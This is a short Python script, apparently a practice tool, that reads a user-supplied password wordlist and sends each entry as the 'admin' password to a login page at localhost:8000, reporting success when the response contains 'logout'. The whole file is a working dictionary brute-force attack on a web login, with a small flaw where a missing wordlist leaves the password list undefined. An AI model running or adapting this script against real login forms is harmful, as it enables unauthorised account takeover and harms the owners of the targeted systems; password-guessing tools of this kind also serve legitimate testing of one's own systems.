import requests
from pathlib import Path


def wd():
    cd = input("Put the path of your wordlist: \n")
    cd = cd.strip('"\'')
    cdR = Path(cd)

    if cdR.exists():
        return cdR
    else:
        return None

rs = wd()

if rs == None:
    print("Couldn't find your path, try it again")
else:
    with open (rs,"r") as file:
        pssw = file.read().splitlines()
try:
    for wod in pssw:
        data = {"user": "admin", "password": wod}
        response = requests.post("http://localhost:8000/admin/login.php", data=data) #mandar um post
        print(f"Trying password: {wod}")
        if "logout" in response.text:
            print("[+] Success!")
        else: 
            print("[-] Incorrect password!")
except Exception as error:
    print(f"[-] An error occurred: {error}")

